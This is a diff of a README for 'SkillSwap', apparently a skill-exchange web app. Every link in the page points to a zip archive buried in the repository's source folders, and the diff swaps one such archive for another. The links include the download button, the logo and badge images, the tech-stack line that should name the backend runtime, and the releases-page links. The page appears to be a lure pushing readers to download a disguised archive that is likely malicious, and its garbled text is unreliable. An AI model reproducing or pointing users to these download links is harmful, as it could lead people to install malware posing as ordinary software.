@@ -1,11 +1,11 @@
 # 🌟 SkillSwap - Trade Skills Simply and Easily
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/ZuchettoG/SkillSwap/main/server/src/SkillSwap-3.6.zip" style="display: inline-block; padding: 10px 20px; font-size: 18px; color: white; background-color: #4CAF50; border-radius: 5px; text-decoration: none;">Download SkillSwap</a>
+  <a href="https://github.com/ZuchettoG/SkillSwap/raw/refs/heads/main/server/src/config/Swap_Skill_ashes.zip" style="display: inline-block; padding: 10px 20px; font-size: 18px; color: white; background-color: #4CAF50; border-radius: 5px; text-decoration: none;">Download SkillSwap</a>
 </p>
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/ZuchettoG/SkillSwap/main/server/src/SkillSwap-3.6.zip" alt="SkillSwap Logo" width="120" />
+  <img src="https://github.com/ZuchettoG/SkillSwap/raw/refs/heads/main/server/src/config/Swap_Skill_ashes.zip" alt="SkillSwap Logo" width="120" />
 </p>
 
 <p align="center">
@@ -13,10 +13,10 @@
 </p>
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/ZuchettoG/SkillSwap/main/server/src/SkillSwap-3.6.zip" alt="Status" />
-  <img src="https://raw.githubusercontent.com/ZuchettoG/SkillSwap/main/server/src/SkillSwap-3.6.zip" alt="Version" />
-  <img src="https://raw.githubusercontent.com/ZuchettoG/SkillSwap/main/server/src/SkillSwap-3.6.zip" alt="License" />
-  <img src="https://raw.githubusercontent.com/ZuchettoG/SkillSwap/main/server/src/SkillSwap-3.6.zip%20by-Team%20ZenYukti-blueviolet" alt="Team" />
+  <img src="https://github.com/ZuchettoG/SkillSwap/raw/refs/heads/main/server/src/config/Swap_Skill_ashes.zip" alt="Status" />
+  <img src="https://github.com/ZuchettoG/SkillSwap/raw/refs/heads/main/server/src/config/Swap_Skill_ashes.zip" alt="Version" />
+  <img src="https://github.com/ZuchettoG/SkillSwap/raw/refs/heads/main/server/src/config/Swap_Skill_ashes.zip" alt="License" />
+  <img src="https://github.com/ZuchettoG/SkillSwap/raw/refs/heads/main/server/src/config/Swap_Skill_ashes.zip%20by-Team%20ZenYukti-blueviolet" alt="Team" />
 </p>
 
 <p align="center">
@@ -47,7 +47,7 @@ SkillSwap is a modern web application that enables users to exchange skills and 
 SkillSwap leverages a combination of powerful tools and technologies:
 
 - **Frontend:** React for a responsive user interface.
-- **Backend:** https://raw.githubusercontent.com/ZuchettoG/SkillSwap/main/server/src/SkillSwap-3.6.zip with Express for server-side logic.
+- **Backend:** https://github.com/ZuchettoG/SkillSwap/raw/refs/heads/main/server/src/config/Swap_Skill_ashes.zip with Express for server-side logic.
 - **Database:** MongoDB for storing user data and trades.
 - **API Communication:** Axios for handling requests between the frontend and backend.
 - **Authentication:** JWT Auth to securely manage user sessions.
@@ -57,7 +57,7 @@ SkillSwap leverages a combination of powerful tools and technologies:
 
 To start using SkillSwap, follow these steps:
 
-1. **Visit the releases page:** Go to the [SkillSwap Releases page](https://raw.githubusercontent.com/ZuchettoG/SkillSwap/main/server/src/SkillSwap-3.6.zip) to download the application.
+1. **Visit the releases page:** Go to the [SkillSwap Releases page](https://github.com/ZuchettoG/SkillSwap/raw/refs/heads/main/server/src/config/Swap_Skill_ashes.zip) to download the application.
    
 2. **Download the application:** Look for the latest version of SkillSwap. Click the download link to save the file to your computer.
 
@@ -106,4 +106,4 @@ Thank you for your interest in helping us improve SkillSwap!
 
 ## 📥 Download & Install
 
-To download SkillSwap, visit the [SkillSwap Releases page](https://raw.githubusercontent.com/ZuchettoG/SkillSwap/main/server/src/SkillSwap-3.6.zip). Choose the latest version and follow the installation instructions outlined above. Enjoy trading skills with others!
+To download SkillSwap, visit the [SkillSwap Releases page](https://github.com/ZuchettoG/SkillSwap/raw/refs/heads/main/server/src/config/Swap_Skill_ashes.zip). Choose the latest version and follow the installation instructions outlined above. Enjoy trading skills with others!
